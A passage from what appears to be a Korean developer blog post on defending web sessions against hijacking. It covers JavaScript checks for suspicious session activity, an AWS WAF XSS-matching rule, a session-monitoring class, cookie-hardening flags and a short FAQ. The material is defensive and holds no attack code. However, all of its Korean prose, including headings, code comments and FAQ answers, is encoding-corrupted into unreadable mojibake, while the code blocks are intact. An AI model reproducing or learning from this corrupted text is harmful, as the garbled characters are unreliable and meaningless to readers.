    // User-Agent ë³€ê²½ (ë¸Œë¼ìš°ì € ë°”ë€)
    session.userAgent !== req.headers['user-agent'],
    // ë„ˆë¬´ ë¹ ë¥¸ ìš”ì²­ (ë´‡ ê°€ëŠ¥ì„±)
    session.lastAccess && Date.now() - session.lastAccess < 100,
  ];

  if (suspicious.some((check) => check)) {
    console.warn('ğŸš¨ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ì„¸ì…˜ í™œë™ ê°ì§€!');
    // ìë™ ë¡œê·¸ì•„ì›ƒ ë˜ëŠ” ì¶”ê°€ ì¸ì¦ ìš”êµ¬
    return null;
  }

  return session;
};
```

---

## 6. ì‹¤ì œë¡œ ì“°ëŠ” ë°©ì–´ ì „ëµ

### ì‹¤ì œë¡œ í•´ ë³¼ ìˆ˜ ìˆëŠ” ë‹¤ì–‘í•œ ë°©ì–´ ì „ëµ

**1. AWS WAF ì„¤ì • (ì›” $5ë¶€í„° ì‹œì‘)**

```javascript
// XSS íŒ¨í„´ ìë™ ì°¨ë‹¨ ê·œì¹™
{
  "Name": "XSSProtection",
  "Statement": {
    "XssMatchStatement": {
      "FieldToMatch": { "AllQueryArguments": {} },
      "TextTransformations": [{ "Type": "HTML_ENTITY_DECODE" }]
    }
  }
}
```

**2. ì„¸ì…˜ ì´ìƒ í–‰ë™ ëª¨ë‹ˆí„°ë§**

```javascript
class SessionMonitor {
  async checkSuspiciousActivity(session) {
    // ğŸŒ ìœ„ì¹˜ ê¸‰ë³€ (ì„œìš¸ â†’ ë‰´ìš• 10ë¶„ ë‚´?)
    const locationJump = await this.checkGeoLocation(session);

    // ğŸ“± ë””ë°”ì´ìŠ¤ ë³€ê²½ (iPhone â†’ Android?)
    const deviceChange = this.checkDeviceFingerprint(session);

    // âš¡ ë¹„ì •ìƒ ì†ë„ (1ì´ˆì— 100ë²ˆ ìš”ì²­?)
    const tooFast = this.checkAccessPattern(session);

    if (locationJump || deviceChange || tooFast) {
      // ğŸ”’ ìë™ ë¡œê·¸ì•„ì›ƒ + ì¬ì¸ì¦ ìš”êµ¬
      this.forceReAuthentication(session);
    }
  }
}
```

---

## ë§ˆë¬´ë¦¬

### ê°„ë‹¨í•˜ê²Œ ì •ë¦¬

```javascript
// 1. ì…ë ¥ê°’ ì´ìŠ¤ì¼€ì´í”„ (í•„ìˆ˜!)
const safe = input.replace(/[<>&"']/g, (c) => escapeMap[c]);

// 2. HttpOnly ì¿ í‚¤ (í•„ìˆ˜!)
res.setHeader('Set-Cookie', 'sid=...; HttpOnly');

// 3. HTTPS ì‚¬ìš© ì‹œ Secure ì¶”ê°€
if (process.env.NODE_ENV === 'production') {
  cookieOptions += '; Secure';
}

// 4. CSRF ë°©ì–´ë¥¼ ìœ„í•œ SameSite
cookieOptions += '; SameSite=Strict';

// 5. ìë™ ë¡œê·¸ì•„ì›ƒ (30ë¶„)
cookieOptions += '; Max-Age=1800';
```

### ê¶ê¸ˆí•œ ë‚´ìš©ë“¤ ì •ë¦¬

**Q: `JWT` ì“°ë©´ ì„¸ì…˜ í•˜ì´ì¬í‚¹ì— ëŒ€í•˜ì—¬ ì•ˆì „í•œê°€ìš”?**

> A: ì•„ë‹ˆìš”! `JWT`ë„ ì¿ í‚¤ë‚˜ `localStorage`ì— ì €ì¥í•˜ë©´ ë˜‘ê°™ì´ íƒˆì·¨ ê°€ëŠ¥í•©ë‹ˆë‹¤.

**Q: `HTTPS`ë§Œ ì“°ë©´ ì„¸ì…˜ í•˜ì´ì¬í‚¹ì— ëŒ€í•˜ì—¬ ì•ˆì „í•œê°€ìš”?**

> A: `ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘`ì€ ë§‰ì§€ë§Œ, `XSS` ê³µê²©ì€ ë§‰ì§€ ëª»í•©ë‹ˆë‹¤.

**Q: ê°œë°œ í™˜ê²½ì—ì„œ `Secure` í”Œë˜ê·¸ ë•Œë¬¸ì— ì¿ í‚¤ê°€ ì•ˆ ë³´ì—¬ìš”! ë•Œë¬¸ì— ì„¸ì…˜ í•˜ì´ì¬í‚¹ì— ëŒ€í•˜ì—¬ ì•ˆì „í•œê°€ìš”?**

> A: `localhost`ëŠ” ì˜ˆì™¸ì ìœ¼ë¡œ `Secure` ì—†ì´ë„ ë™ì‘í•©ë‹ˆë‹¤. `ê°œë°œ/í”„ë¡œë•ì…˜`ì„ êµ¬ë¶„í•˜ì—¬ ì²˜ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

---

**ì§ˆë¬¸ì´ë‚˜ í”¼ë“œë°±ì€ ëŒ“ê¸€ë¡œ ë‚¨ê²¨ì£¼ì„¸ìš”!** ğŸ™
